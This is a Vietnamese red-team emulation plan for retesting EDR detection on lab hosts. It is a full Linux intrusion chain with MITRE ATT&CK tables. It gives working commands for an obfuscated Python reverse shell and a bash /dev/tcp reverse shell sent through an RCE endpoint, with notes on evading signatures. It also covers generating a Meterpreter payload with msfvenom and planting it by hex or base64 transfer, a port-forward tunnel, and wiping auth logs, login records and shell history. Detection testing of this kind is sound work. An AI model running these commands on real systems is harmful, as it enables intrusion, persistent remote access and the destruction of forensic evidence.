# Micro Emulation Plan - Retest EDR Gap Closure (Generic Lab)

<!-- Nguồn: EDR_Detection_Specification.md (đặc tả yêu cầu đã gộp & ẩn danh, thay cho Phu_luc_I/BaoCao gốc) + Setup.md (lab generic). Không phải CTI công khai - tài liệu nội bộ, dùng làm tham chiếu thay cho URL. -->
[1]: ../EDR_Detection_Specification.md
[2]: Setup.md

---

## Step 0 - Setup

### Procedures

- Xác nhận `app-host` (10.10.10.10) đã cài sản phẩm EDR cần test, đang chạy healthy, và đã hoàn tất checklist trong `Setup.md` §5.
- Xác nhận dịch vụ `dummyapp` (gunicorn, chạy dưới `svcapp`) đang `active (running)` trên `app-host`, lắng nghe cổng 8888.
- Xác nhận operator có kết nối tới `attacker` (10.10.10.5) với `msfvenom`, `metasploit-framework`, `nc`, `python3` sẵn sàng.
- Xác nhận đã seed credential `opsuser`@`target-host` (10.10.10.20) theo `Setup.md` §4 nếu Step 6 nằm trong phạm vi lần chạy này.
- Ghi lại baseline (`Setup.md` §2.6) trước khi bắt đầu Step 1.
- Trên `attacker`, tạo payload Meterpreter (thuần local, không chạm `app-host`, không nằm trong tầm quan sát của sản phẩm cần test):

  ```bash
  msfvenom -p linux/x86/meterpreter/bind_tcp LPORT=9001 -f elf -o backupv2
  ```

  - ***Expected Output***
    ```text
    Payload size: <N> bytes
    Saved as: backupv2
    ```

- Mở sẵn listener chờ reverse shell (thuần local trên `attacker`, chưa có kết nối/tương tác nào với `app-host`):

  ```bash
  nc -lvnp 4444
  ```

---

## Step 1 - Execution / Command and Scripting Interpreter: Reverse Shell Foothold trên `app-host`

### Voice Track

Attacker bắt đầu từ vị trí chưa có quyền thực thi nào trên `app-host`, ngoài khả năng gọi tới dịch vụ ứng dụng đang chạy công khai trên đó. Vì vector RCE thật của lần khai thác gốc không nằm trong phạm vi tài liệu nguồn, attacker dùng endpoint mô phỏng có kiểm soát của lab (`/debug/exec`) để tái tạo đúng điều kiện xuất phát mà kịch bản gốc mô tả: "đã có quyền user ứng dụng". Lệnh gọi tới endpoint này khiến chính app daemon (gunicorn, chạy dưới `svcapp`) sinh ra một tiến trình con mở kết nối reverse-shell ngược về attacker. Kỹ thuật chính dùng ở đây đổi tên hàm `socket.socket` (qua `import socket as z`), tránh hẳn flag `-i` và cú pháp `/dev/tcp/`, và truyền code qua stdin thay vì tham số `-c` - nhờ vậy né được chữ ký reverse-shell kinh điển (`bash -i`, `/dev/tcp/`) mà hầu hết EDR/YARA đã có rule tĩnh, đồng thời không lộ nội dung mã độc trên cmdline của tiến trình `python3`. Từ đây, toàn bộ chuỗi hành vi phía sau kế thừa đúng process-tree "app daemon → shell", bất kể dùng kỹ thuật chính này hay biến thể `bash -i`/`/dev/tcp/` cổ điển ở Step 1B.

### Procedures

- ☣️ Payload đã sẵn sàng và listener đã mở từ Step 0. Gọi endpoint RCE mô phỏng trên `dummyapp` để bật reverse shell dưới quyền `svcapp` - đây là hành vi đầu tiên thực sự chạm tới `app-host`. Đổi tên hàm `socket.socket` (qua `import socket as z; z.socket(...)`), tránh flag `-i`, tránh `/dev/tcp/`, và truyền code qua stdin thay vì tham số `-c` để không lộ nội dung trong cmdline của tiến trình `python3`:

  ```bash
  # Trên attacker
  PY_CODE='import os,socket as z;s=z.socket(z.AF_INET,z.SOCK_STREAM);s.connect(("10.10.10.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.execve("/bin/sh",["/bin/sh"],os.environ)'
  PY_B64=$(echo -n "$PY_CODE" | base64 -w0)

  curl -s -G "http://10.10.10.10:8888/debug/exec" \
    --data-urlencode "cmd=nohup bash -c \"echo $PY_B64 | base64 -d | python3\" &"
  ```

  - ***Expected Output***
    ```text
    connect to [10.10.10.5] from (UNKNOWN) [10.10.10.10] <port>
    $                                    # /bin/sh không có job control như bash -i
    ```

### Reference Tables

| Summary | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
| - | - | - | - | - | - | - | - | - | - | - | - |
| HTTP request to dummyapp `/debug/exec` RCE bootstrap endpoint | Initial Access | T1190 | Exploit Public-Facing Application | Linux | TBD | TBD | Attacker sends an HTTP request to the lab's controlled RCE endpoint on the app daemon to obtain code execution as the service account. | app-host (10.10.10.10) | attacker (unauthenticated HTTP) | [debug_exec](../resources/setup/Setup.md) | [2] |
| gunicorn worker (svcapp) spawns bash -c wrapper child process | Execution | T1059.004 | Command and Scripting Interpreter: Unix Shell | Linux | TBD | TBD | The dummyapp gunicorn worker process, running as `svcapp`, executes a `bash -c` wrapper in response to the RCE call - the parent shell for the decode-and-run pipeline that follows. | app-host (10.10.10.10) | svcapp | - | - |
| bash -c pipeline spawns base64 -d child decoding reverse-shell payload from stdin | Defense Evasion | T1140 | Deobfuscate/Decode Files or Information | Linux | TBD | TBD | The `bash -c` wrapper forks a `base64 -d` child that decodes the base64-encoded Python payload streamed via `echo`, without persisting a decoded file to disk. | app-host (10.10.10.10) | svcapp | - | - |
| bash -c pipeline spawns python3 child running decoded reverse-shell code via stdin | Execution | T1059.006 | Command and Scripting Interpreter: Python | Linux | TBD | TBD | The `bash -c` wrapper forks a `python3` child that reads the decoded reverse-shell code from stdin rather than a `-c` argument, avoiding exposure of the code on the process command line. | app-host (10.10.10.10) | svcapp | - | - |
| svcapp reverse-shell outbound TCP connection to attacker:4444 | Command and Control | T1095 | Non-Application Layer Protocol | Linux | TBD | TBD | The spawned python3 process opens an outbound TCP connection from `app-host` to the attacker host on port 4444 and execve's `/bin/sh`, establishing an interactive reverse shell. | app-host (10.10.10.10) | svcapp | - | - |

---

## Step 1B - Alternative Step for Reverse Shell Technique in Step 1 - Classic `bash -i` qua `/dev/tcp`

### Voice Track

Step 1B là biến thể đối chứng của Step 1, dùng đúng nguyên bản kỹ thuật `bash -i` qua `/dev/tcp/` đã khai thác thành công ở lần test trước - chuỗi `bash -i`, `/dev/tcp/` là chữ ký reverse-shell kinh điển mà gần như mọi EDR/YARA đều đã có rule tĩnh. Attacker chạy thêm biến thể này (không thay thế Step 1 trong lần chạy chính) để kiểm tra xem sản phẩm phát hiện theo hành vi tổng quát "app daemon spawn tiến trình mở kết nối ra ngoài" hay chỉ khớp đúng cú pháp reverse-shell kinh điển trong cmdline. Toàn bộ phần còn lại của chuỗi hành vi ở Step 2 (ghi payload Meterpreter, chmod, thực thi, v.v.) không đổi bất kể dùng Step 1 hay Step 1B để lấy shell ban đầu.

### Procedures

- ☣️ Gọi endpoint RCE mô phỏng trên `dummyapp` để bật reverse shell dưới quyền `svcapp` bằng cú pháp `bash -i` qua `/dev/tcp/` kinh điển:

  ```bash
  # Trên attacker
  curl "http://10.10.10.10:8888/debug/exec?cmd=nohup+bash+-c+%22bash+-i+>%26+/dev/tcp/10.10.10.5/4444+0>%261%22+%26"
  ```

  - ***Expected Output***
    ```text
    connect to [10.10.10.5] from (UNKNOWN) [10.10.10.10] <port>
    bash: no job control in this shell
    svcapp@app-host:~$
    ```

### Reference Tables

| Summary | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
| - | - | - | - | - | - | - | - | - | - | - | - |
| gunicorn worker (svcapp) spawns bash reverse-shell child process | Execution | T1059.004 | Command and Scripting Interpreter: Unix Shell | Linux | TBD | TBD | The dummyapp gunicorn worker process, running as `svcapp`, executes `bash -i` as a child process in response to the RCE call - unlike Step 1, no intermediate `base64`/`python3` children are spawned. | app-host (10.10.10.10) | svcapp | - | - |
| svcapp reverse-shell outbound TCP connection to attacker:4444 (Step 1B run) | Command and Control | T1095 | Non-Application Layer Protocol | Linux | TBD | TBD | The spawned bash process itself opens the outbound TCP connection via `/dev/tcp/`, unlike Step 1 where the connection is opened by a separate `python3` child process. | app-host (10.10.10.10) | svcapp | - | - |

---

## Step 2 - Command and Control / Ingress Tool Transfer: Bindshell Payload trên `app-host`

### Voice Track

Từ shell reverse-shell vừa thiết lập ở Step 1 (hoặc biến thể Step 1B), attacker ghi payload Meterpreter bind_tcp đã chuẩn bị sẵn (Step 0) lên `app-host`, cấp quyền thực thi, và chạy nó để mở thêm một shell với nhiều module tấn công hơn. Kỹ thuật chính dùng ở đây ghi file bằng hex-escape qua `echo -ne` và cấp quyền thực thi bằng `chmod +x` - cả hai đều là lệnh builtin/phổ biến của bash, không sinh thêm process con nào khác trong process-tree, khác với việc gọi thêm một tiến trình `base64` hoặc `python3` riêng biệt như ở Step 2B.

### Procedures

- ☣️ Từ shell vừa thiết lập ở Step 1, ghi payload lên `app-host` bằng kỹ thuật hex-escape qua `echo -ne` (không dùng `scp`/`curl`, không spawn thêm process ngoài builtin `echo` của bash), đặt vào thư mục nhạy cảm (`/tmp` hoặc home của `svcapp`):

  Trên `attacker`, chuyển `backupv2` thành chuỗi hex-escape:

  ```bash
  xxd -p backupv2 | tr -d '\n' | sed 's/\(..\)/\\x\1/g' > backupv2.hexstr
  cat backupv2.hexstr
  ```

  Dán nguyên chuỗi vừa lấy được vào shell `svcapp` đã có trên `app-host`:

  ```bash
  # Trên shell svcapp vừa có, thay <hexstr> bằng nội dung backupv2.hexstr
  echo -ne '<hexstr>' > /tmp/backupv2
  ```

  Biến thể tương đương (cùng nhóm builtin-only, không sinh thêm process con, có thể dùng thay cho lệnh `echo -ne` ở trên) - vòng lặp giải mã hex bằng chính `printf` builtin thay vì truyền toàn bộ hexstr qua một argument duy nhất:

  ```bash
  # Trên shell svcapp vừa có, thay <hexstr> bằng nội dung backupv2.hexstr
  s='<hexstr>'
  for ((i=0; i<${#s}; i+=2)); do printf "\\x${s:i:2}"; done > /tmp/backupv2
  ```

  Cách này không đổi công cụ/kỹ thuật (vẫn builtin bash, vẫn không spawn process ngoài), chỉ tránh việc toàn bộ payload nằm gọn trong một argument dài duy nhất trên cmdline - né được các rule content-inspection soi "process argument dài bất thường", nhưng không đổi bản chất hành vi ghi file so với `echo -ne` nên không tạo thêm biến thể/step mới.

  Sau khi ghi xong nên đối chiếu kích thước/hash với payload gốc để đảm bảo không bị cắt/lỗi trong quá trình copy-paste:

  ```bash
  ls -l /tmp/backupv2
  sha256sum /tmp/backupv2   # so với sha256sum backupv2 chạy trên attacker
  ```

- ☣️ Cấp quyền thực thi bằng `chmod` - lệnh đơn, phổ biến, không sinh thêm interpreter nào khác trong process-tree:

  ```bash
  chmod +x /tmp/backupv2
  ```

- ☣️ Chạy payload dưới quyền `svcapp`:

  ```bash
  /tmp/backupv2 &
  ```

- Xác nhận trực tiếp trên `app-host` rằng payload đang giữ một listening socket dưới quyền `svcapp` (bằng chứng độc lập, không suy ra gián tiếp từ kết nối phía attacker):

  ```bash
  ss -tlnp 2>/dev/null | grep 9001
  ```

  - ***Expected Output***
    ```text
    LISTEN 0 ... 0.0.0.0:9001 ... users:(("backupv2",pid=<N>,fd=...))
    ```

- Trên `attacker`, xác nhận session Meterpreter mở thành công:

  ```bash
  msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/meterpreter/bind_tcp; set LPORT 9001; set RHOST 10.10.10.10; exploit"
  ```

  - ***Expected Output***
    ```text
    [*] Meterpreter session 1 opened (10.10.10.5:<port> -> 10.10.10.10:9001)
    ```

### Reference Tables

| Summary | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
| - | - | - | - | - | - | - | - | - | - | - | - |
| svcapp writes ELF bindshell payload via echo/hex-dump to sensitive directory | Command and Control | T1105 | Ingress Tool Transfer | Linux | TBD | TBD | From the reverse shell, attacker writes the `backupv2` ELF payload into `/tmp` using `echo`/hex-dump reconstruction instead of a standard file-transfer channel. | app-host (10.10.10.10) | svcapp | - | [1] |
| svcapp writes ELF bindshell payload via echo/hex-dump to sensitive directory | Defense Evasion | T1027.010 | Obfuscated Files or Information: Command Obfuscation | Linux | TBD | TBD | Writing the ELF via `echo`/hex-dump instead of a standard file-transfer tool avoids leaving a recognizable binary-transfer artifact, obfuscating the file content in transit. | app-host (10.10.10.10) | svcapp | - | [1] |
| chmod execute-bit grant on newly written ELF payload | Defense Evasion | T1222.002 | File and Directory Permissions Modification: Linux and Mac | Linux | TBD | TBD | Attacker sets the executable bit on the newly written `backupv2` file. | app-host (10.10.10.10) | svcapp | - | - |
| svcapp execve of backupv2 Meterpreter bind_tcp payload | Execution | T1059.004 | Command and Scripting Interpreter: Unix Shell | Linux | TBD | TBD | Attacker executes the ELF payload under the `svcapp` account. | app-host (10.10.10.10) | svcapp | - | [1] |
| backupv2 Meterpreter bind_tcp listens on TCP/9001 | Command and Control | T1095 | Non-Application Layer Protocol | Linux | TBD | TBD | The running payload opens a listening TCP socket on port 9001, a port outside the app's normal service profile. | app-host (10.10.10.10) | svcapp | - | [1] |
| msfconsole multi/handler connects to backupv2 bind port | Command and Control | T1095 | Non-Application Layer Protocol | Linux | TBD | TBD | Attacker connects from the attack host to `app-host:9001` to confirm the Meterpreter session opened successfully. | attacker (10.10.10.5) | attacker | - | - |

---

## Step 2B - Alternative Step for Write/Chmod Technique in Step 2 - Base64 Write + Python `os.chmod`

### Voice Track

Step 2B là biến thể đối chứng của Step 2, dùng base64 thay cho hex-escape để ghi payload, và gọi `os.chmod` qua một tiến trình `python3` riêng thay cho lệnh `chmod` trực tiếp. Cả hai lựa chọn ở đây đều sinh thêm một process con mới trong process-tree (`base64` khi ghi file, `python3 -c` khi cấp quyền thực thi) so với các builtin dùng ở Step 2 - attacker chạy thêm biến thể này (không thay thế Step 2 trong lần chạy chính) để kiểm tra xem sản phẩm phát hiện theo hành vi tổng quát "ghi ELF vào thư mục nhạy cảm" / "cấp quyền thực thi cho file trong thư mục nhạy cảm" nói chung, hay chỉ khớp riêng theo tiến trình `echo`/`chmod` cụ thể dùng ở Step 2.

### Procedures

- ☣️ Từ shell vừa thiết lập ở Step 1, ghi payload lên `app-host` bằng base64 (không dùng `scp`/`curl`), đặt vào thư mục nhạy cảm (`/tmp` hoặc home của `svcapp`):

  Trên `attacker`:

  ```bash
  base64 -w0 backupv2 > backupv2.b64
  cat backupv2.b64
  ```

  Trên shell `svcapp` đã có:

  ```bash
  # Thay <b64string> bằng nội dung backupv2.b64
  echo -n '<b64string>' | base64 -d > /tmp/backupv2
  ```

  Biến thể tương đương (cùng nhóm sinh thêm một process con để decode, có thể dùng thay cho `base64 -d` ở trên - chỉ đổi tên binary cụ thể để tránh các rule chỉ liệt kê đúng process `base64`, không đổi bản chất kỹ thuật):

  ```bash
  # Cách 1 - openssl (binary hợp pháp, phổ biến cho TLS/crypto, ít bị rule chỉ soi riêng `base64` bắt)
  echo -n '<b64string>' | openssl base64 -d > /tmp/backupv2

  # Cách 2 - basenc (coreutils, cùng họ base64/base32/base16 nhưng ít phổ biến hơn)
  echo -n '<b64string>' | basenc --base64 -d > /tmp/backupv2

  # Cách 3 - perl (spawn tiến trình perl thay vì base64/openssl/basenc)
  echo -n '<b64string>' | perl -MMIME::Base64 -0777 -ne 'print decode_base64($_)' > /tmp/backupv2
  ```

  Base64 gọn hơn (khoảng 4/3 kích thước gốc so với 4x của hex-escape) và an toàn ký tự hơn khi copy-paste qua nhiều lớp shell/URL-encode, nhưng đổi hẳn signature lệnh ghi file so với Step 2 và sinh thêm một tiến trình `base64` con.

  Sau khi ghi xong nên đối chiếu kích thước/hash với payload gốc để đảm bảo không bị cắt/lỗi trong quá trình copy-paste:

  ```bash
  ls -l /tmp/backupv2
  sha256sum /tmp/backupv2   # so với sha256sum backupv2 chạy trên attacker
  ```

- ☣️ Cấp quyền thực thi qua `os.chmod` của Python thay vì gọi trực tiếp `chmod`:

  ```bash
  python3 -c "import os; os.chmod('/tmp/backupv2', 0o755)"
  ```

- ☣️ Chạy payload dưới quyền `svcapp`:

  ```bash
  /tmp/backupv2 &
  ```

- Xác nhận trực tiếp trên `app-host` rằng payload đang giữ một listening socket dưới quyền `svcapp` (bằng chứng độc lập, không suy ra gián tiếp từ kết nối phía attacker):

  ```bash
  ss -tlnp 2>/dev/null | grep 9001
  ```

  - ***Expected Output***
    ```text
    LISTEN 0 ... 0.0.0.0:9001 ... users:(("backupv2",pid=<N>,fd=...))
    ```

- Trên `attacker`, xác nhận session Meterpreter mở thành công:

  ```bash
  msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/meterpreter/bind_tcp; set LPORT 9001; set RHOST 10.10.10.10; exploit"
  ```

  - ***Expected Output***
    ```text
    [*] Meterpreter session 1 opened (10.10.10.5:<port> -> 10.10.10.10:9001)
    ```

### Reference Tables

| Summary | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
| - | - | - | - | - | - | - | - | - | - | - | - |
| svcapp writes ELF bindshell payload via base64-decode pipeline to sensitive directory (Step 2B run) | Command and Control | T1105 | Ingress Tool Transfer | Linux | TBD | TBD | From the reverse shell, attacker writes the `backupv2` ELF payload into `/tmp` by piping base64-encoded text into a `base64 -d` child process instead of the hex-escape builtin used in Step 2. | app-host (10.10.10.10) | svcapp | - | [1] |
| svcapp writes ELF bindshell payload via base64-decode pipeline to sensitive directory (Step 2B run) | Defense Evasion | T1027.010 | Obfuscated Files or Information: Command Obfuscation | Linux | TBD | TBD | Writing the ELF via a base64-decode pipeline instead of a standard file-transfer tool avoids leaving a recognizable binary-transfer artifact, obfuscating the file content in transit. | app-host (10.10.10.10) | svcapp | - | [1] |
| python3 -c os.chmod execute-bit grant on newly written ELF payload | Execution | T1059.006 | Command and Scripting Interpreter: Python | Linux | TBD | TBD | Attacker spawns a `python3 -c` child process to set the executable bit on the newly written `backupv2` file via `os.chmod`, instead of calling `chmod` directly as in Step 2. | app-host (10.10.10.10) | svcapp | - | - |
| python3 -c os.chmod execute-bit grant on newly written ELF payload | Defense Evasion | T1222.002 | File and Directory Permissions Modification: Linux and Mac | Linux | TBD | TBD | Attacker spawns a `python3 -c` child process to set the executable bit on the newly written `backupv2` file via `os.chmod`, instead of calling `chmod` directly as in Step 2. | app-host (10.10.10.10) | svcapp | - | - |

---

## Step 3 - Command and Control / Proxy: Port-Forward cho SSH phi chuẩn

### Voice Track

Với shell Meterpreter đã có từ Step 2, attacker muốn thiết lập thêm một kênh truy cập song song không phụ thuộc vào tiến trình bindshell tạm thời - cụ thể là cho phép SSH vào `app-host` qua một cổng phi chuẩn. Attacker viết lại một script Python port-forward với cấu trúc/tên biến khác so với lần test trước (loại trừ khả năng chặn theo chữ ký script tĩnh) nhưng giữ nguyên hành vi: mở một socket lắng nghe cục bộ và forward traffic tới sshd nội bộ. Toàn bộ thao tác này vẫn chạy trong đúng session đã có từ Step 2, nên process-tree "app daemon → shell → script" được giữ nguyên.

### Procedures

- ☣️ Từ shell hiện có, viết script Python port-forward vào thư mục nhạy cảm. Tham khảo cấu trúc tại [`resources/pf.py`](../resources/pf.py) (listener cục bộ + relay 2 chiều bằng thread tới sshd nội bộ) nhưng **đổi tên biến/hàm và cấu trúc** trước khi dán - dùng nguyên văn file này sẽ tạo lại đúng chữ ký script tĩnh của lần test trước, phá vỡ mục đích đối chứng của Step 3:

  ```bash
  cat > /tmp/pf.py <<'EOF'
  import socket, threading
  # bind local listener, forward to local sshd (logic viết lại, không trùng script cũ)
  EOF
  ```

- ☣️ Chạy script dưới quyền `svcapp`:

  ```bash
  python3 /tmp/pf.py &
  ```

  - ***Expected Output***
    ```text
    [*] listening on 0.0.0.0:2222, forwarding to 127.0.0.1:22
    ```

- Từ `attacker`, SSH vào `app-host` qua cổng phi chuẩn thông qua kênh forward vừa tạo:

  ```bash
  ssh -p 2222 svcapp@10.10.10.10
  ```

- Xác nhận trực tiếp trên `app-host` rằng script Python đang giữ **đồng thời** một listening socket và một connect socket - đây là bằng chứng độc lập cho hành vi port-forward/relay, không suy ra gián tiếp từ việc SSH thành công:

  ```bash
  ss -tnp 2>/dev/null | grep -E ':2222|:22 '
  ```

  - ***Expected Output***
    ```text
    LISTEN     0    ...  0.0.0.0:2222   ...  users:(("python3",pid=<N>,fd=...))
    ESTAB      0    ...  127.0.0.1:<ephemeral> 127.0.0.1:22  users:(("python3",pid=<N>,fd=...))
    ```

### Reference Tables

| Summary | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
| - | - | - | - | - | - | - | - | - | - | - | - |
| custom Python port-forward script write to sensitive directory | Command and Control | T1105 | Ingress Tool Transfer | Linux | TBD | TBD | Attacker writes a newly authored (non-reused) Python port-forwarding script into `/tmp` under `svcapp`. | app-host (10.10.10.10) | svcapp | [pf.py](../resources/pf.py) | [1] |
| svcapp execve of Python port-forward script | Execution | T1059.006 | Command and Scripting Interpreter: Python | Linux | TBD | TBD | Attacker executes the port-forward script under `svcapp`. | app-host (10.10.10.10) | svcapp | [pf.py](../resources/pf.py) | - |
| pf.py process binds and listens on non-standard port 2222 | Command and Control | T1572 | Protocol Tunneling | Linux | TBD | TBD | The running script opens a local listening socket on a non-standard port (2222), a passive socket distinct from the app's normal service profile. | app-host (10.10.10.10) | svcapp | [pf.py](../resources/pf.py) | [1] |
| attacker SSH session via non-standard forwarded port | Command and Control | T1572 | Protocol Tunneling | Linux | TBD | TBD | Attacker connects via SSH to `app-host` through the port-forward channel just created, instead of the standard SSH port. Same host as the original foothold, so this is use of the tunnel (C2 channel), not a lateral-movement hop to a new system. | attacker (10.10.10.5) | svcapp (destination account) | - | [1] |
| pf.py process opens outbound connect to local sshd and relays forwarded traffic | Command and Control | T1572 | Protocol Tunneling | Linux | TBD | TBD | Upon accepting the attacker's incoming connection, the script opens a second, distinct socket connecting to the local sshd (127.0.0.1:22) and relays traffic bidirectionally between the two sockets. | app-host (10.10.10.10) | svcapp | [pf.py](../resources/pf.py) | [1] |

---

## Step 4 - Defense Evasion: Xóa dấu vết đăng nhập và lịch sử lệnh

### Voice Track

Sau khi đã thiết lập hai kênh truy cập song song (bindshell + port-forward), attacker thực hiện track-covering để che giấu hoạt động vừa diễn ra: ghi đè các file ghi nhận đăng nhập hệ thống, xóa nội dung log xác thực dạng text, và xoá lịch sử lệnh của chính shell đang dùng - cả phần đã ghi ra đĩa lẫn phần sẽ ghi tiếp. Toàn bộ vẫn thực hiện trong session đã có từ Step 1/2/3, không cần thiết lập lại foothold.

Bốn file log mục tiêu (`wtmp`, `btmp`, `auth.log`, `lastlog`) có mức quyền mặc định khác nhau trên Debian/Ubuntu: `wtmp` cho phép group `utmp` ghi, còn `btmp`/`auth.log`/`lastlog` mặc định **chỉ owner (root/syslog) ghi được**, group chỉ đọc hoặc không có group riêng. Danh sách 4 file này khớp đúng procedure CTI tham chiếu (Salt Typhoon: "cleared logs including .bash_history, auth.log, lastlog, wtmp, and btmp" - xem `mitre-knowledge-base/techniques/TA0005-defense-evasion.md` §T1070.002). Lab đã cấp sẵn quyền ghi cho `svcapp` trên cả 4 file qua group `utmp` + ACL (`Setup.md` §2.1bis) để tái tạo đúng điều kiện "Redteam khai thác thành công" ở tài liệu gốc - nếu chạy lại kịch bản này trên một hệ thống khác (kể cả hệ thống thật) mà chưa xác nhận quyền tương đương, các lệnh truncate bên dưới có thể trả về `Permission denied`, và đó tự nó là một tín hiệu đáng ghi nhận (OS hardening chặn được, không phải EDR).

Đoạn xóa lịch sử lệnh dùng tổ hợp `shred` (xóa nội dung cũ) + symlink `~/.bash_history` sang `/dev/null` (chặn ghi tiếp ở tầng filesystem) thay vì chỉ `unset HISTFILE`/`history -c` - cách cũ phụ thuộc biến môi trường, dễ mất tác dụng nếu một shell con sau đó set lại `HISTFILE`; symlink giữ hiệu lực bất kể biến môi trường thế nào (tổ hợp từ Atomic Test #4 + #6 trong `atomic-red-team/atomics/T1070.003/T1070.003.md`, không phải kỹ thuật tự chế).

### Procedures

- Xác nhận quyền ghi trước khi thực hiện (không phải hành vi tấn công, chỉ để biết lệnh dưới có khả năng thành công hay không):

  ```bash
  id -nG svcapp
  getfacl /var/log/btmp /var/log/auth.log /var/log/lastlog 2>/dev/null
  ```

  - ***Expected Output***
    ```text
    svcapp ... utmp
    # file: var/log/btmp
    user:svcapp:rw-
    # file: var/log/auth.log
    user:svcapp:rw-
    # file: var/log/lastlog
    user:svcapp:rw-
    ```

- ☣️ Ghi đè `wtmp`/`utmp`/`btmp` để xóa dấu vết đăng nhập:

  ```bash
  > /var/log/wtmp
  > /var/run/utmp
  > /var/log/btmp
  ```

- ☣️ Truncate log xác thực dạng text (trên RHEL/CentOS, thay bằng `/var/log/secure`) và bản ghi đăng nhập gần nhất mỗi user. Với riêng `auth.log`, Cách A là kỹ thuật chính; Cách B là biến thể đối chứng, không bắt buộc, dùng syscall `truncate()` trực tiếp theo path thay vì `open(O_TRUNC)` để kiểm tra sản phẩm có theo dõi cả hai đường hay chỉ một (lưu ý: trick này **không áp dụng được** cho `wtmp`/`utmp`/`btmp`/`lastlog` vì đó là log nhị phân riêng, thường được sản phẩm theo dõi qua một nhóm điều kiện khác đã bao gồm cả `truncate`/`ftruncate`):

  **Cách A - redirection `>` (chính):**

  ```bash
  > /var/log/auth.log
  > /var/log/lastlog
  ```

  **Cách B - `truncate -s 0` cho `auth.log` (biến thể đối chứng, tuỳ chọn):**

  ```bash
  # ☣️ Chỉ chạy nếu muốn đối chứng - không dùng thay cho Cách A ở lần chạy chính
  # lastlog vẫn dùng "> /var/log/lastlog" như Cách A, không đổi
  truncate -s 0 /var/log/auth.log
  ```

- Đối chiếu với baseline đã ghi ở `Setup.md` §2.6 để xác nhận đã xoá thành công:

  ```bash
  last -f /var/log/wtmp | wc -l
  lastb -f /var/log/btmp 2>/dev/null | wc -l
  lastlog | wc -l
  stat -c '%n %s' /var/log/wtmp /var/run/utmp /var/log/btmp /var/log/auth.log /var/log/lastlog
  ```

  - ***Expected Output***
    ```text
    0                                  # last/lastb: không còn entry nào, so với baseline > 0
    1                                  # lastlog: chỉ còn dòng header, so với baseline nhiều hơn
    /var/log/wtmp 0
    /var/run/utmp 0
    /var/log/btmp 0
    /var/log/auth.log 0                # kích thước 0 byte, so với baseline_logfiles_size.txt
    /var/log/lastlog 0
    ```

- **Biến thể đối chứng (tuỳ chọn, không bắt buộc):** thay vì truncate `wtmp` về 0 byte (dấu hiệu rất lộ trên host còn hoạt động), xoá chọn lọc chỉ record của attacker, giữ nguyên các session hợp lệ khác - dùng để kiểm tra sản phẩm phát hiện theo "file log bị sửa/thiếu record" hay chỉ theo "file 0 byte". Đây là kỹ thuật tự thiết kế dựa trên nguyên lý các log-cleaner cổ điển (`utmpdump`/`wtmpclean`), không có trong ART, **chỉ chạy thêm** nếu muốn đối chứng, không thay thế bước truncate chính ở trên:

  ```bash
  # ☣️ Chỉ chạy nếu muốn đối chứng - không dùng thay cho bước truncate wtmp chính
  utmpdump /var/log/wtmp > /tmp/.wtmp.txt
  grep -v "10.10.10.5" /tmp/.wtmp.txt > /tmp/.wtmp.clean.txt
  utmpdump -r /tmp/.wtmp.clean.txt > /var/log/wtmp
  rm -f /tmp/.wtmp.txt /tmp/.wtmp.clean.txt
  ```

- ☣️ Xoá nội dung lịch sử lệnh đã ghi ra đĩa của chính session hiện tại - bash ghi định kỳ vào `HISTFILE` mặc định (thường `~/.bash_history`) ngay cả khi không có `.bashrc` tùy chỉnh, nên các lệnh ở Step 1/2 có thể đã được flush ra đĩa trước khi chạy bước này. Cách A là kỹ thuật chính (xoá sạch nội dung cũ trên đĩa, khó khôi phục forensic); Cách B là biến thể đối chứng, không bắt buộc, dùng builtin của chính bash thay vì spawn một tiến trình xoá-log riêng, để kiểm tra sản phẩm phát hiện theo hành vi "nội dung history bị xoá" nói chung hay chỉ khi có tiến trình ngoài (`shred`/`wipe`/...) thực hiện việc đó - đánh đổi là chỉ để lại file rỗng 0 byte thay vì unlink+ghi đè, nên kém sạch hơn về mặt forensic:

  **Cách A - `shred` (chính):**

  ```bash
  shred -u ~/.bash_history 2>/dev/null || rm -f ~/.bash_history
  ```

  **Cách B - builtin redirection của bash (biến thể đối chứng, tuỳ chọn):**

  ```bash
  # ☣️ Chỉ chạy nếu muốn đối chứng - không dùng thay cho Cách A ở lần chạy chính
  > ~/.bash_history
  ```

- ☣️ Symlink `~/.bash_history` sang `/dev/null` để chặn ghi tiếp ở tầng filesystem - mạnh hơn chỉ `unset HISTFILE`, vì vẫn có hiệu lực kể cả khi một shell con sau đó set lại biến `HISTFILE`:

  ```bash
  ln -sf /dev/null ~/.bash_history
  unset HISTFILE
  export HISTFILESIZE=0
  history -c
  ```

  - ***Expected Output***
    ```text
    (không có output; xác nhận bằng: ls -la ~/.bash_history → lrwxrwxrwx ... ~/.bash_history -> /dev/null)
    ```

### Reference Tables

| Summary | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
| - | - | - | - | - | - | - | - | - | - | - | - |
| svcapp truncates wtmp/utmp/btmp login-record logs | Defense Evasion | T1070.002 | Indicator Removal: Clear Linux or Mac System Logs | Linux | TBD | TBD | Attacker overwrites `wtmp`, `utmp`, `btmp` to erase login-session records. | app-host (10.10.10.10) | svcapp | - | [1] |
| svcapp truncates auth.log authentication text log | Defense Evasion | T1070.002 | Indicator Removal: Clear Linux or Mac System Logs | Linux | TBD | TBD | Attacker truncates the authentication text log to remove further evidence of the session. | app-host (10.10.10.10) | svcapp | - | [1] |
| svcapp truncates lastlog last-login-record database | Defense Evasion | T1070.002 | Indicator Removal: Clear Linux or Mac System Logs | Linux | TBD | TBD | Attacker truncates `/var/log/lastlog` to erase the per-user last-login timestamp record, matching the full log set cleared in the reference CTI procedure. | app-host (10.10.10.10) | svcapp | - | [1] |
